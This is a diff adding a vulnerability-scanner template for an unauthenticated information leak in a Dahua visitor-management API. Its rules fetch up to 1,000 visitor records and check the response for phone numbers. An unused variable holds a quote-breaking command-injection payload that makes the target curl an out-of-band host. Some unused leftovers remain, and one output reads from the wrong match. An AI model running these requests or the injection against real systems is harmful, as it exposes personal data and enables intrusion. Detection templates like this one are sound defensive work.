@@ -1,0 +1,54 @@
+id: dahua-wulian-info-unleak
+info:
+  name: dahua-wulian-info-unleak
+  severity: critical
+  author: 
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  oobDNS: oob.DNS
+  baseurl: request.url
+  rboundary: randomInt(800000000, 1000000000)
+  s1: randomLowercase(8)
+  payload: base64("\';curl " + oobHTTP + " %23")
+  base64payload: base64Decode("123456")
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /evo-apigw/evo-visitor/1.0.0/card/visitor/user/info?userId=4&pageNum=1&pageSize=1000
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+      body:
+      
+    expression: response.status == 200 && (response.body.bcontains(b"phone") || response.body.ibcontains(b"phone"))
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /evo-apigw/evo-visitor/1.0.0/card/visitor/user/info?userId=6&pageNum=1&pageSize=1000
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+      body:
+      
+    expression: response.status == 200 && (response.body.bcontains(b"phone") || response.body.ibcontains(b"phone"))
+
+expression: r0() || r1()
